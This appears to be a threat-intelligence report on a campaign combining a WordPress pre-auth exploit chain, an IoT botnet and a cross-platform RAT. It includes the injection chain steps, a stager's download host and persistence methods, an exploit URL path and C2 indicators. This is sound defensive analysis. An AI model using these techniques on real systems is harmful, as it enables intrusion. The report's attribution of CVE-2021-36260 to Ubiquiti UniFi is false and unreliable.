-      <div class="fc-body">
-        Batch <code>/v1</code> route-confusion desync → UNION/blind SQLi → oEmbed cache poisoning → customize_changeset pivot → <code>POST /wp/v2/users</code> admin creation (pre-auth) → plugin webshell. Affects WP 6.9.0–7.0.1. Admin account and webshell auto-deleted post-session.
-      </div>
-    </div>
-
-    <div class="finding-card">
-      <span class="fc-tag fc-tag-red">CONFIRMED ROOT COMPROMISES</span>
-      <div class="fc-title">Automated Mass Deployment</div>
-      <div class="fc-body">
-        Two deployment runs against multiple Ubiquiti UniFi targets via CVE-2021-36260. Confirmed root on majority. Four-method persistence (systemd, crontab, init.d, profile). Agent disguised as <code>.uniFi-core</code>, <code>cache-mgr</code>, <code>syslog-ng</code>, <code>dbusd</code>. Deploy scripts written in Mandarin Chinese.
-      </div>
-    </div>
-
-    <div class="finding-card">
-      <span class="fc-tag fc-tag-orange">JUNIPER SRX320 STRING</span>
-      <div class="fc-title">Firewall / Enterprise Targeting</div>
-      <div class="fc-body">
-        Unpacked Linux binary contains: <code>falling back to SRX320 raw exec: %q#!/bin/sh</code> — an explicit Juniper SRX320 firewall fallback execution path. This extends targeting beyond IoT into enterprise network infrastructure, adding a significant threat escalation vector not evident from scripts alone.
-      </div>
-    </div>
-
-    <div class="finding-card">
-      <span class="fc-tag fc-tag-yellow">IFEO ABUSE + ARGV SPOOFING</span>
-      <div class="fc-title">Three-Layer Process Masquerading</div>
-      <div class="fc-body">
-        Windows: <code>disguiseIFEO</code> writes own path as <code>Debugger</code> value under <code>Image File Execution Options\</code> — hijacks legitimate process launches. Linux: <code>prctl PR_SET_NAME</code> + separate <code>spoofArgv</code> defeat both <code>ps</code> and <code>/proc/self/status</code> simultaneously. <code>daemonize</code> forks to background, detaches from terminal. No EDR-visible artifacts.
-      </div>
-    </div>
-
-    <div class="finding-card">
-      <span class="fc-tag fc-tag-purple">SOCKS5 PROXY + CONPTY SHELL</span>
-      <div class="fc-title">Full Network Pivoting Capability</div>
-      <div class="fc-body">
-        Confirmed handlers: <code>handleProxyStart/Stop</code> + <code>handleSOCKS5</code> — the agent acts as a full SOCKS5 proxy for operator lateral movement. Windows PE implements <code>CreatePseudoConsole</code> (ConPTY) for interactive terminal sessions with proper resize. libp2p peer ID persisted at <code>~/.p2p/peer_id</code> indicates P2P C2 channel in development.
-      </div>
-    </div>
-
-  </div>
-</div>
-
-<div class="stat-chips">
-  <div class="stat-chip"><span class="sc-num sc-red">167+</span><span class="sc-label">IoT Compromised</span></div>
-  <div class="stat-chip"><span class="sc-num sc-red">14</span><span class="sc-label">CPU Architectures</span></div>
-  <div class="stat-chip"><span class="sc-num sc-orange">4</span><span class="sc-label">CVEs Exploited</span></div>
-  <div class="stat-chip"><span class="sc-num sc-purple">3</span><span class="sc-label">Victim Regions</span></div>
-  <div class="stat-chip"><span class="sc-num sc-blue">6</span><span class="sc-label">Persist Methods</span></div>
-  <div class="stat-chip"><span class="sc-num sc-yellow">2</span><span class="sc-label">OS Platforms</span></div>
-</div>
-
-<div class="ev-section">
-  <figure class="ev-fig">
-    <img src="opendir_wp2shell.png" alt="Open directory listing — staging server">
-    <div class="ev-cap">Open directory — staging server (:80). Agent binaries, stager script, and operator tooling left exposed without authentication.</div>
-  </figure>
-</div>
-
-<!-- 01 OVERVIEW -->
-<h2 id="overview">01. Executive Overview</h2>
-
-<p>During continuous monitoring operations, an attacker-controlled <strong>open directory</strong> on a staging server was discovered — left browsable without authentication. The repository exposed a complete unified attack platform active since July 10, 2026: a WordPress exploitation toolkit leveraging a pre-authentication SQL injection in WordPress core, and a large-scale IoT botnet targeting Ubiquiti, D-Link, and Totolink devices. The open directory is the source of recovered artifacts, not the primary C2; agent communications route independently to <code>v9g6.my:443</code>.</p>
-
-<p>Both attack vectors — WordPress exploitation and IoT compromise — are part of a single campaign and deliver the same payload: <strong>Agent-TCP</strong>, a cross-platform Go RAT compiled for 14 CPU architectures. Unpacked binary analysis reveals capabilities well beyond what the deployment scripts suggest — including in-memory fileless execution via Linux <code>MemfdCreate</code>, Windows DLL injection, post-quantum TLS (MLKEM), and an explicit Juniper SRX320 firewall execution fallback. The operator's development machine path leaked through the binary (see §05 Build Metadata).</p>
-
-<div class="callout-red">
-  <p><strong>Note:</strong> Full source code, deployment logs, target lists, and operator scripts were recovered from the open directory without authentication.</p>
-</div>
-
-<p>Operator scripts contain Mandarin Chinese comments (<code>批量部署</code>, <code>架构映射</code>, <code>持久化</code>, <code>提权到 root</code>). A dedicated target list focused on Chunghwa Telecom's network was recovered, along with a separate HNAP reconnaissance directory. A LoongArch64 binary variant is included in the payload set. No attribution to any specific threat actor is made.</p>
-
-<!-- 02 INFRASTRUCTURE -->
-<h2 id="infrastructure">02. Infrastructure Architecture</h2>
-
-<p>The infrastructure separates three distinct roles across two servers. The staging server — its open directory was the source of all recovered artifacts — separates artifact delivery from C2. Deployed agents do <em>not</em> report back here for tasking; they connect independently to <code>v9g6.my:443</code>. The :8443 port only receives lightweight heartbeat pings from shell-persistence scripts, not full RAT sessions.</p>
-
-<div class="tbl-wrap">
-<table>
-  <thead><tr><th>Endpoint</th><th>Role</th><th>Key Files / Function</th></tr></thead>
-  <tbody>
-    <tr><td class="mono red-text">[staging-server]:80</td><td class="strong">Staging / Artifact Distribution</td><td class="mono">agent_linux_*, agent_windows_amd64.exe, wp2shell_stager.sh — open directory (no auth)</td></tr>
-    <tr><td class="mono red-text">[staging-server]:8443</td><td class="strong">Deploy Scripts + Heartbeat Receiver</td><td class="mono">dbusd_*, stager.sh, dropper.sh, persist.sh — /beacon endpoint (shell-only pings)</td></tr>
-    <tr><td class="mono red-text">v9g6.my → 202.61.136.40</td><td class="strong">RAT C2 (primary — agent comms)</td><td class="mono">Full TCP/TLS control channel · ChaCha20Poly1305 · tasking, exec, upload, SOCKS5</td></tr>
-    <tr><td class="mono" style="color:var(--orange)">43.161.245.209</td><td class="strong">Secondary C2 — Under Investigation</td><td class="mono">Multiple associated domains — potential infrastructure overlap with this campaign</td></tr>
-  </tbody>
-</table>
-</div>
-
-<div class="ev-section">
-  <figure class="ev-fig">
-    <img src="opendir_wp2shell_stager.png" alt="wp2shell Stager — source code">
-    <div class="ev-cap">wp2shell Stager — post-exploit shell script recovered from the open directory. Architecture detection, multi-method download, 4-method persistence installation.</div>
-  </figure>
-</div>
-<div class="ev-section">
-  <figure class="ev-fig">
-    <img src="opendir_wp2shell_ack.png" alt="C2 ACK — host PC-KGE5382 connecting to v9g6.my:8443">
-    <div class="ev-cap">C2 ACK — compromised host <code>PC-KGE5382</code> checking in to <code>v9g6.my:8443</code>. Server returns <code>PL=22 RID=4000</code> confirming active beacon session.</div>
-  </figure>
-</div>
-
-<h3>Infrastructure Topology</h3>
-
-<div class="diagram-wrap">
-<svg viewBox="0 0 840 420" width="840" height="420" xmlns="http://www.w3.org/2000/svg" style="background:#0d1117;border:1px solid #21262d;border-radius:8px;">
-  <defs>
-    <marker id="ah" markerWidth="9" markerHeight="7" refX="8" refY="3.5" orient="auto"><polygon points="0 0,9 3.5,0 7" fill="#484f58"/></marker>
-    <marker id="ar" markerWidth="9" markerHeight="7" refX="8" refY="3.5" orient="auto"><polygon points="0 0,9 3.5,0 7" fill="#ff4444"/></marker>
-    <marker id="ao" markerWidth="9" markerHeight="7" refX="8" refY="3.5" orient="auto"><polygon points="0 0,9 3.5,0 7" fill="#f97316"/></marker>
-    <marker id="ab" markerWidth="9" markerHeight="7" refX="8" refY="3.5" orient="auto"><polygon points="0 0,9 3.5,0 7" fill="#3b82f6"/></marker>
-    <marker id="ag" markerWidth="9" markerHeight="7" refX="8" refY="3.5" orient="auto"><polygon points="0 0,9 3.5,0 7" fill="#22c55e"/></marker>
-  </defs>
-
-  <!-- ─── VPS Center ──────────────────────────────────────────────────────── -->
-  <rect x="296" y="148" width="232" height="108" rx="7" fill="#1a0a0a" stroke="#ff4444" stroke-width="1.8"/>
-  <text x="412" y="178" text-anchor="middle" font-family="'Courier New',monospace" font-size="13" font-weight="700" fill="#ff4444">[staging-server]</text>
-  <text x="412" y="198" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" fill="#8b949e">:80 — payload server</text>
-  <text x="412" y="214" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" fill="#8b949e">:8443 — beacon / deploy</text>
-  <!-- divider lines for ports -->
-  <line x1="316" y1="186" x2="508" y2="186" stroke="#21262d" stroke-width="1"/>
-
-  <!-- ─── RAT C2 (top right) ─────────────────────────────────────────────── -->
-  <rect x="614" y="62" width="202" height="88" rx="7" fill="#0a0f1a" stroke="#3b82f6" stroke-width="1.6"/>
-  <text x="715" y="90" text-anchor="middle" font-family="'Courier New',monospace" font-size="12" font-weight="700" fill="#3b82f6">v9g6.my</text>
-  <text x="715" y="108" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" fill="#8b949e">202.61.136.40 : 443</text>
-  <text x="715" y="124" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#484f58">RAT C2 · ChaCha20Poly1305</text>
-  <text x="715" y="140" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#484f58">TLS 1.3 + ECH + MLKEM</text>
-
-  <!-- ─── Beacon box (bottom right) ─────────────────────────────────────── -->
-  <rect x="614" y="272" width="202" height="72" rx="7" fill="#0f1117" stroke="#484f58" stroke-width="1.2"/>
-  <text x="715" y="298" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" font-weight="700" fill="#8b949e">:8443/beacon</text>
-  <text x="715" y="314" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#484f58">?host=&amp;arch=&amp;id=</text>
-  <text x="715" y="330" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#484f58">heartbeat every 10 min</text>
-
-  <!-- ─── Agent-TCP (bottom center) ─────────────────────────────────────── -->
-  <rect x="296" y="322" width="232" height="72" rx="7" fill="#0a1a0a" stroke="#22c55e" stroke-width="1.6"/>
-  <text x="412" y="350" text-anchor="middle" font-family="'Courier New',monospace" font-size="13" font-weight="700" fill="#22c55e">Agent-TCP</text>
-  <text x="412" y="368" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#8b949e">Linux ELF · Windows PE · 14 archs</text>
-  <text x="412" y="384" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#484f58">UPX 4.22 · Go 1.26.4 · MemfdCreate</text>
-
-  <!-- ─── Attack vector boxes (left column) ─────────────────────────────── -->
-  <!-- WordPress -->
-  <rect x="18" y="44" width="178" height="72" rx="6" fill="#111" stroke="#f97316" stroke-width="1.2"/>
-  <text x="107" y="70" text-anchor="middle" font-family="'Courier New',monospace" font-size="11" font-weight="700" fill="#f97316">WordPress 6.9–7.0.1</text>
-  <text x="107" y="86" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#8b949e">wp2shell pre-auth SQLi</text>
-  <text x="107" y="102" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#484f58">/wp-json/batch/v1</text>
-
-  <!-- UniFi -->
-  <rect x="18" y="162" width="178" height="72" rx="6" fill="#111" stroke="#ff4444" stroke-width="1.2"/>
-  <text x="107" y="188" text-anchor="middle" font-family="'Courier New',monospace" font-size="11" font-weight="700" fill="#ff4444">Ubiquiti UniFi</text>
-  <text x="107" y="204" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#8b949e">CVE-2021-36260</text>
-  <text x="107" y="220" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#484f58">unauthenticated root RCE</text>
-
-  <!-- D-Link / Totolink -->
-  <rect x="18" y="280" width="178" height="72" rx="6" fill="#111" stroke="#f97316" stroke-width="1.2"/>
-  <text x="107" y="306" text-anchor="middle" font-family="'Courier New',monospace" font-size="11" font-weight="700" fill="#f97316">D-Link / Totolink</text>
-  <text x="107" y="322" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#8b949e">CVE-2026-34908 / CVE-2026-1547</text>
-  <text x="107" y="338" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#484f58">HNAP / UPnP · dbusd masquerade</text>
-
-  <!-- ─── Arrows ─────────────────────────────────────────────────────────── -->
-  <!-- WP (right=196, mid-y=80) → VPS left (296, y=176) -->
-  <line x1="196" y1="80" x2="288" y2="176" stroke="#f97316" stroke-width="1.4" marker-end="url(#ao)"/>
-  <text x="232" y="122" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#f97316">wp2shell exploit</text>
-  <text x="232" y="133" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#484f58">+ stager download</text>
-
-  <!-- UniFi (right=196, mid-y=198) → VPS left (296, y=200) -->
-  <line x1="196" y1="198" x2="288" y2="200" stroke="#ff4444" stroke-width="1.4" marker-end="url(#ar)"/>
-  <text x="242" y="192" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#ff4444">CVE-2021-36260</text>
-
-  <!-- D-Link (right=196, mid-y=316) → VPS left (296, y=224) -->
-  <line x1="196" y1="316" x2="288" y2="224" stroke="#f97316" stroke-width="1.4" marker-end="url(#ao)"/>
-  <text x="232" y="278" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#f97316">CVE stagers</text>
-
-  <!-- VPS bottom (412,256) → Agent top (412,322) -->
-  <line x1="412" y1="256" x2="412" y2="314" stroke="#22c55e" stroke-width="1.4" stroke-dasharray="6,3" marker-end="url(#ag)"/>
-  <text x="430" y="288" font-family="'Courier New',monospace" font-size="9" fill="#22c55e">download</text>
-  <text x="430" y="300" font-family="'Courier New',monospace" font-size="9" fill="#484f58">arch-specific binary</text>
-
-  <!-- Agent right (528,350) → elbow → RAT C2 left (614,106) -->
-  <!-- Route: (528,350) → (576,350) → (576,106) → (614,106) -->
-  <polyline points="528,350 576,350 576,106 614,106" fill="none" stroke="#3b82f6" stroke-width="1.4" stroke-dasharray="5,3" marker-end="url(#ab)"/>
-  <text x="556" y="236" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#3b82f6" transform="rotate(-90 556 236)">TLS 1.3 · C2 control</text>
-
-  <!-- VPS right (528,230) → Beacon left (614,308) -->
-  <line x1="528" y1="230" x2="606" y2="290" stroke="#484f58" stroke-width="1.2" stroke-dasharray="4,3" marker-end="url(#ah)"/>
-  <text x="566" y="254" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#484f58">beacon :8443</text>
-
-  <!-- ─── Legend ─────────────────────────────────────────────────────────── -->
-  <rect x="18" y="398" width="804" height="1" fill="#21262d"/>
-  <line x1="24" y1="412" x2="44" y2="412" stroke="#ff4444" stroke-width="1.4"/>
-  <text x="48" y="415" font-family="'Courier New',monospace" font-size="9" fill="#484f58">exploit path</text>
-  <line x1="118" y1="412" x2="138" y2="412" stroke="#22c55e" stroke-width="1.4" stroke-dasharray="5,3"/>
-  <text x="142" y="415" font-family="'Courier New',monospace" font-size="9" fill="#484f58">agent download</text>
-  <line x1="234" y1="412" x2="254" y2="412" stroke="#3b82f6" stroke-width="1.4" stroke-dasharray="5,3"/>
-  <text x="258" y="415" font-family="'Courier New',monospace" font-size="9" fill="#484f58">C2 channel (TLS 1.3)</text>
-  <line x1="380" y1="412" x2="400" y2="412" stroke="#484f58" stroke-width="1.2" stroke-dasharray="4,3"/>
-  <text x="404" y="415" font-family="'Courier New',monospace" font-size="9" fill="#484f58">heartbeat (dim)</text>
-</svg>
-</div>
-
-<h3>Exploitation Surface</h3>
-<div class="tbl-wrap">
-<table>
-  <thead><tr><th>CVE / Vulnerability</th><th>Target</th><th>Access Path</th></tr></thead>
-  <tbody>
-    <tr><td><span class="pill p-red">CVE-2026-63030</span></td><td>WordPress 6.9.0–7.0.1 Core</td><td class="mono">serve_batch_request_v1() route-confusion desync → unauthenticated /wp-json/batch/v1 SQLi (UNION/blind/error)</td></tr>
-    <tr><td><span class="pill p-red">CVE-2026-60137</span></td><td>WordPress 6.9.0–7.0.1 Core</td><td class="mono">POST /wp/v2/users authz bypass via desync'd handler → zero-credential administrator creation</td></tr>
-    <tr><td><span class="pill p-red">CVE-2021-36260</span></td><td>Ubiquiti UniFi Network App</td><td class="mono">/api/auth/validate-sso/..%2f..%2fproxy/…/latest_package?pkg_name=&lt;b64&gt;&amp;by_cmd=true</td></tr>
-    <tr><td><span class="pill p-orange">CVE-2026-34908</span></td><td>D-Link HNAP / UPnP</td><td class="mono">stager.sh — HNAP post-exploit → dbusd_* dropper</td></tr>
-    <tr><td><span class="pill p-orange">CVE-2026-1547</span></td><td>Totolink routers</td><td class="mono">install.sh — mips/arm arch, cron + rc.local persist</td></tr>
-    <tr><td><span class="pill p-yellow">DIR-850L HNAP</span></td><td>D-Link DIR-850L</td><td class="mono">dropper.sh → busybox-mipsel + telnetd -p 9999</td></tr>
-    <tr><td><span class="pill p-yellow">SRX320 (binary)</span></td><td>Juniper SRX320 firewall</td><td class="mono">Embedded fallback path in agent binary — raw exec via shell</td></tr>
-  </tbody>
-</table>
-</div>
-
-<!-- 03 WORDPRESS -->
-<h2 id="wordpress">03. WordPress Pre-Auth RCE — wp2shell (CVE-2026-63030 + CVE-2026-60137)</h2>
-
-<p>The wp2shell toolkit chains two WordPress Core CVEs to achieve zero-credential remote code execution. <strong>CVE-2026-63030</strong> is a route-confusion desync in <code>serve_batch_request_v1()</code>: the function builds two parallel arrays (<code>$matches</code> and <code>$validation</code>) indexed by the same offset. A sub-request failing <code>wp_parse_url()</code> is appended to <code>$validation</code> but not to <code>$matches</code>, causing array desync — a subsequent request is dispatched under the wrong (unauthenticated) handler, enabling UNION/blind/error-based SQLi via the oEmbed cache and a <code>customize_changeset</code> pivot. <strong>CVE-2026-60137</strong> is an authorization bypass in <code>POST /wp/v2/users</code> that allows the same desync'd unauthenticated request to create a WordPress administrator — no credentials required at any step. Affected: WordPress 6.9.0–7.0.1. Fixed: 7.0.2 / 6.9.5.</p>
-
-<h3>Six-Step Exploitation Chain</h3>
-<div class="stage-list">
-  <div class="stage-item">
-    <div class="stage-num">01</div>
-    <div><div class="stage-name">Route-Confusion SQLi</div><div class="stage-desc">Batch desync places a <code>GET /wp/v2/posts/999999</code> request under <code>get_items()</code>. <code>author_exclude</code> parameter maps to <code>WP_Query author__not_in</code>, which is interpolated into SQL — UNION/error/blind extraction all available.</div></div>
-  </div>
-  <div class="stage-item">
-    <div class="stage-num">02</div>
-    <div><div class="stage-name">oEmbed Cache Poisoning</div><div class="stage-desc">UNION-forged fake <code>wp_posts</code> rows cause WordPress to render <code>[embed]</code> shortcodes, creating real <code>oembed_cache</code> database entries for attacker-controlled URLs. IDs recovered via SQLi.</div></div>
-  </div>
-  <div class="stage-item">
-    <div class="stage-num">03</div>
-    <div><div class="stage-name">customize_changeset Pivot</div><div class="stage-desc">Seven poisoned UNION rows forge a graph: <code>customize_changeset</code> → <code>nav_menu_item</code> → <code>request</code> post types, using recovered oEmbed cache IDs as parent pointers. A single batch request triggers the chain.</div></div>
-  </div>
-  <div class="stage-item">
-    <div class="stage-num">04</div>
-    <div><div class="stage-name">Pre-Auth Admin Creation</div><div class="stage-desc"><code>POST /wp/v2/users</code> creates a <code>wp2_&lt;nonce&gt;</code> administrator with email <code>@wp2shell.invalid</code>, exercised through the same route-confusion dispatch — zero credentials required.</div></div>
-  </div>
-  <div class="stage-item">
-    <div class="stage-num">05</div>
-    <div><div class="stage-name">Plugin Webshell Upload</div><div class="stage-desc">Authenticated as the generated admin, a random-path plugin webshell is uploaded. Path and per-run token are randomized. WordPress's plugin upload mechanism handles delivery.</div></div>
-  </div>
-  <div class="stage-item">
-    <div class="stage-num">06</div>
-    <div><div class="stage-name">Stager Execution + Cleanup</div><div class="stage-desc"><code>wp2shell_stager.sh</code> runs via webshell: detects arch (<code>uname -m</code>), downloads matching agent from the staging server, establishes persistence. Webshell and admin account auto-deleted.</div></div>
-  </div>
-</div>
-
-<h3>Exploitation Flow — wp2shell</h3>
-
-<div class="diagram-wrap">
-<svg viewBox="0 0 762 240" width="762" height="240" xmlns="http://www.w3.org/2000/svg" style="background:#0d1117;border:1px solid #21262d;border-radius:8px;">
-  <defs>
-    <marker id="aw" markerWidth="9" markerHeight="7" refX="8" refY="3.5" orient="auto">
-      <polygon points="0 0,9 3.5,0 7" fill="#f97316"/>
-    </marker>
-    <marker id="awk" markerWidth="9" markerHeight="7" refX="8" refY="3.5" orient="auto">
-      <polygon points="0 0,9 3.5,0 7" fill="#22c55e"/>
-    </marker>
-  </defs>
-
-  <!-- ─── Phase label bar ─────────────────────────────────────────────────── -->
-  <rect x="12" y="12" width="736" height="22" rx="4" fill="#0f1117" stroke="#21262d" stroke-width="1"/>
-  <text x="22" y="27" font-family="'Courier New',monospace" font-size="9" fill="#484f58">PHASE  →</text>
-  <text x="82" y="27" font-family="'Courier New',monospace" font-size="9" fill="#f97316">RECON + DESYNC</text>
-  <text x="222" y="27" font-family="'Courier New',monospace" font-size="9" fill="#ff4444">EXTRACT</text>
-  <text x="346" y="27" font-family="'Courier New',monospace" font-size="9" fill="#f97316">POISON DB</text>
-  <text x="472" y="27" font-family="'Courier New',monospace" font-size="9" fill="#ff4444">PRIVILEGE</text>
-  <text x="594" y="27" font-family="'Courier New',monospace" font-size="9" fill="#f97316">DELIVER</text>
-  <text x="694" y="27" font-family="'Courier New',monospace" font-size="9" fill="#22c55e">EXECUTE</text>
-
-  <!-- ─── Step boxes (y=46, h=100) ─────────────────────────────────────────── -->
-  <!-- Box 1: x=12, w=100 → right=112 -->
-  <rect x="12" y="46" width="100" height="100" rx="6" fill="#1a100a" stroke="#f97316" stroke-width="1.4"/>
-  <text x="62" y="72" text-anchor="middle" font-family="'Courier New',monospace" font-size="11" font-weight="700" fill="#f97316">01</text>
-  <text x="62" y="90" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" fill="#e6edf3">Route-Confusion</text>
-  <text x="62" y="106" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#8b949e">batch/v1 desync</text>
-  <text x="62" y="120" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">→ get_items()</text>
-  <text x="62" y="136" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">no auth needed</text>
-
-  <!-- Arrow 1→2: x1=112 x2=136 y=96 -->
-  <line x1="112" y1="96" x2="130" y2="96" stroke="#f97316" stroke-width="1.4" marker-end="url(#aw)"/>
-
-  <!-- Box 2: x=138, w=100 → right=238 -->
-  <rect x="138" y="46" width="100" height="100" rx="6" fill="#1a0a0a" stroke="#ff4444" stroke-width="1.6"/>
-  <text x="188" y="72" text-anchor="middle" font-family="'Courier New',monospace" font-size="11" font-weight="700" fill="#ff4444">02</text>
-  <text x="188" y="90" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" fill="#e6edf3">SQL Injection</text>
-  <text x="188" y="106" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#8b949e">author_exclude</text>
-  <text x="188" y="120" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">UNION / blind</text>
-  <text x="188" y="136" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">EXTRACTVALUE</text>
-
-  <line x1="238" y1="96" x2="256" y2="96" stroke="#f97316" stroke-width="1.4" marker-end="url(#aw)"/>
-
-  <!-- Box 3: x=264, w=100 → right=364 -->
-  <rect x="264" y="46" width="100" height="100" rx="6" fill="#1a100a" stroke="#f97316" stroke-width="1.4"/>
-  <text x="314" y="72" text-anchor="middle" font-family="'Courier New',monospace" font-size="11" font-weight="700" fill="#f97316">03</text>
-  <text x="314" y="90" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" fill="#e6edf3">oEmbed Poison</text>
-  <text x="314" y="106" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#8b949e">changeset chain</text>
-  <text x="314" y="120" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">7 forged rows</text>
-  <text x="314" y="136" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">nav_menu_item</text>
-
-  <line x1="364" y1="96" x2="382" y2="96" stroke="#f97316" stroke-width="1.4" marker-end="url(#aw)"/>
-
-  <!-- Box 4: x=390, w=100 → right=490 — CRITICAL -->
-  <rect x="390" y="46" width="100" height="100" rx="6" fill="#280808" stroke="#ff4444" stroke-width="2"/>
-  <text x="440" y="72" text-anchor="middle" font-family="'Courier New',monospace" font-size="11" font-weight="700" fill="#ff4444">04</text>
-  <text x="440" y="90" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" fill="#e6edf3">Pre-Auth Admin</text>
-  <text x="440" y="106" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#8b949e">wp2_&lt;nonce&gt;</text>
-  <text x="440" y="120" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">@wp2shell.invalid</text>
-  <text x="440" y="136" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" font-weight="700" fill="#ff4444">0 credentials</text>
-
-  <line x1="490" y1="96" x2="508" y2="96" stroke="#f97316" stroke-width="1.4" marker-end="url(#aw)"/>
-
-  <!-- Box 5: x=516, w=100 → right=616 -->
-  <rect x="516" y="46" width="100" height="100" rx="6" fill="#1a100a" stroke="#f97316" stroke-width="1.4"/>
-  <text x="566" y="72" text-anchor="middle" font-family="'Courier New',monospace" font-size="11" font-weight="700" fill="#f97316">05</text>
-  <text x="566" y="90" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" fill="#e6edf3">Plugin Webshell</text>
-  <text x="566" y="106" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#8b949e">random path</text>
-  <text x="566" y="120" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">random token</text>
-  <text x="566" y="136" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">auto-deleted</text>
-
-  <line x1="616" y1="96" x2="634" y2="96" stroke="#f97316" stroke-width="1.4" marker-end="url(#aw)"/>
-
-  <!-- Box 6: x=642, w=108 → right=750 — COMPROMISE -->
-  <rect x="642" y="46" width="108" height="100" rx="6" fill="#0a1a0a" stroke="#22c55e" stroke-width="1.8"/>
-  <text x="696" y="72" text-anchor="middle" font-family="'Courier New',monospace" font-size="11" font-weight="700" fill="#22c55e">06</text>
-  <text x="696" y="90" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" fill="#e6edf3">RCE + Stager</text>
-  <text x="696" y="106" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#8b949e">arch detection</text>
-  <text x="696" y="120" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#8b949e">6-method persist</text>
-  <text x="696" y="136" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" font-weight="700" fill="#22c55e">Agent-TCP ▲</text>
-
-  <!-- ─── Footer annotation ─────────────────────────────────────────────── -->
-  <rect x="12" y="162" width="736" height="64" rx="5" fill="#0f1117" stroke="#21262d" stroke-width="1"/>
-  <text x="22" y="180" font-family="'Courier New',monospace" font-size="9" fill="#8b949e">Affected:  WordPress 6.9.0 – 7.0.1</text>
-  <text x="22" y="196" font-family="'Courier New',monospace" font-size="9" fill="#8b949e">Fixed:     7.0.2 / 6.9.5 (update to latest)</text>
-  <text x="22" y="212" font-family="'Courier New',monospace" font-size="9" fill="#484f58">SQLi:      UNION (1 req/value) · EXTRACTVALUE error-based · X-WP-Total blind binary search</text>
-  <text x="22" y="225" font-family="'Courier New',monospace" font-size="9" fill="#484f58">Trigger:   POST /wp-json/batch/v1  ·  No cookies, no nonce, no authentication</text>
-</svg>
-</div>
-
-<div class="callout-orange">
-  <p><strong>SQLi extraction methods:</strong> UNION (1 req/value, reflects via <code>||HEX(value)||</code> in post_title); Error-based EXTRACTVALUE (~15 bytes/req, requires WP_DEBUG); Blind binary search (~8 req/char, X-WP-Total oracle). Tool auto-selects. None of the read methods write database rows.</p>
-</div>
-
-<h3>Post-Compromise Stager</h3>
-<pre><code><span class="muted"># wp2shell_stager.sh — persistence summary</span>
-VPS=<span class="st">"http://[redacted]:80"</span>
-AGENT_PATH=<span class="st">"/tmp/.cache-mgr"</span>   <span class="muted"># dot-prefix hidden</span>
-
-<span class="muted"># Multi-fallback download: curl → wget → python3</span>
-<span class="muted"># Architecture mapping: x86_64/aarch64/armv5/armv7/mips*/ppc64*</span>
-
-<span class="muted"># Root persistence (6 concurrent methods):</span>
-<span class="red">1.</span> crontab <span class="st">@reboot</span> + <span class="fn">*/30 /etc/crontab</span>
-<span class="red">2.</span> /etc/rc.local or /etc/rc.d/rc.local
-<span class="red">3.</span> systemd: <span class="st">/etc/systemd/system/cache-mgr.service</span> (Restart=always, 30s)
-<span class="red">4.</span> /etc/init.d/cache-mgr
-<span class="red">5.</span> /etc/profile, /etc/bashrc, /etc/bash.bashrc injection
-<span class="red">6.</span> /etc/crontab direct write
-
-<span class="muted"># User persistence (www-data / non-root):</span>
-~/.bashrc, ~/.profile, ~/.bash_profile injection
-crontab <span class="st">@reboot</span> (user-level)
-/etc/cron.d/cache-mgr if writable</code></pre>
-
-<!-- 04 IOT -->
-<h2 id="iot">04. IoT Botnet — CVE-2021-36260 + Multi-Vector</h2>
-
-<p>The IoT deployment pipeline uses <code>batch_deploy.py</code> and <code>batch_deploy_full.py</code> to automate mass compromise of Ubiquiti UniFi devices. The exploit path leverages CVE-2021-36260: a path traversal in the SSO validate endpoint combined with command injection via <code>pkg_name</code>, allowing unauthenticated root RCE on the UniFi controller.</p>
-
-<h3>Exploit Path — CVE-2021-36260</h3>
-<pre><code><span class="muted"># batch_deploy.py — exploit path (from unpacked binary correlation)</span>
-BYPATH = <span class="st">"/api/auth/validate-sso/..%2f..%2f..%2fproxy/users/api/v2/ucs/update/latest_package"</span>
-
